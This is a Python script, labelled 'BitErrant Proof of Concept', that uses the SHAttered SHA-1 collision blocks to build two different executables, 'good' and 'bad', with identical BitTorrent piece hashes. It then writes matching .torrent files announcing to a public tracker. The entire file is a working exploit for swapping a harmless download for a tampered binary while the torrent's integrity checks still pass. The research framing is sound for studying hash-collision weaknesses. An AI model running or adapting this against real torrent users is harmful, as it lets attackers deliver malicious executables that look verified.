from hashlib import sha1, md5
import time
import bencode
import sys

def getChunks(data, chunksize = 2**15):
    cl = list()
    for h in [data[i:i+chunksize] for i in range(0, len(data), chunksize)]:
        yield h

def roundTochunksize(x, base = 10):
    return int(base * round(float(x)/base))

def readFileData(input_file):
    data = ''
    with open(input_file, 'rb') as f:
        data = f.read()
    return data

def writeFileData(data, filename):
    with open(filename, 'wb') as f:
        f.write(data)

def byte2carray(data, n=16):
    t = ""
    for chunk in [data[i:i + n] for i in xrange(0, len(data), n)]:
        t += '"'
        for c in chunk:
            t += '\\x'+c.encode('hex')
        t += '"\r\n'
    return t[:-2]

def generateTorrent(data, name):
    tracker = 'http://tracker.opentrackr.org:1337/announce'

    torrent = {}
    torrent["announce"] = tracker
    torrent["announce-list"] = [tracker]
    torrent["creation date"] = int(time.time())
    torrent["created by"] = 'Ben'
    torrent["comment"] = 'BitErrant Proof of Concept'

    info = {}
    info["piece length"] = chunksize
    info["length"] = len(data)
    info["name"] = name
    pieces = [sha1(p).digest() for p in getChunks(data, chunksize)]
    info["pieces"] = ''.join(pieces)
    torrent["info"] = info

    bencoded_torrent = bencode.bencode(torrent)
    return (bencoded_torrent, info["pieces"])

def rebaseCollisionData(original_data, chunksize):
    marker = original_data.find(shattered1[:0x0F])
    print(marker)
    new_marker = roundTochunksize(marker, chunksize)

    if new_marker > marker+chunksize or new_marker < marker-chunksize:
        print('Fuckup :(')
        sys.exit()

    sectionend   = marker+chunksize+chunksize
    sectionstart = marker-chunksize

    # TODO: this only works if new_marker < marker
    goodfile = original_data[:new_marker] + shattered1 + '\x00' * (marker - new_marker) + original_data[sectionend:] 
    badfile = original_data[:new_marker] + shattered2 + '\x00' * (marker - new_marker) + original_data[sectionend:] 

    return (goodfile, badfile)

if __name__ == '__main__':
    print("Starting..")
    input_file = '../cProject/main'
    chunksize = 32*1024
    print("Reading SHAttered PDFs..")
    shattered1 = readFileData('../shatterPDFs/shattered-1.pdf')[:chunksize]
    shattered2 = readFileData('../shatterPDFs/shattered-2.pdf')[:chunksize]

    print("Reading binary..")
    file_data = readFileData(input_file)
    print("Creating new data..")
    (goodfile, badfile) = rebaseCollisionData(file_data, chunksize)
    
    print("Checking wether the to files are the same.. should never happen")
    print("goodfile == badfile: " + str(goodfile == badfile))

    print("Generating two new Executables..")
    writeFileData(goodfile, './output/good')
    writeFileData(badfile, './output/bad')

    print("Generating the good Torrent File..")
    (good_torrent, good_pieces) = generateTorrent(goodfile, 'good')
    print("Generating the bad Torrent File..")
    (bad_torrent, bad_pieces) = generateTorrent(badfile, 'bad')

    print("These should have the same SHA1 Hash")
    print("Hash of good Torrent:")
    print(byte2carray(good_pieces))

    print("Hash of bad Torrent:")
    print(byte2carray(bad_pieces))

    if bad_pieces == good_pieces:
        print("SUCCESS!")
    else:
        print("FAIL!")

    print("Writing both Torrent Files to Disk..")
    writeFileData(good_torrent, './output/good.torrent')
    writeFileData(bad_torrent, './output/bad.torrent')
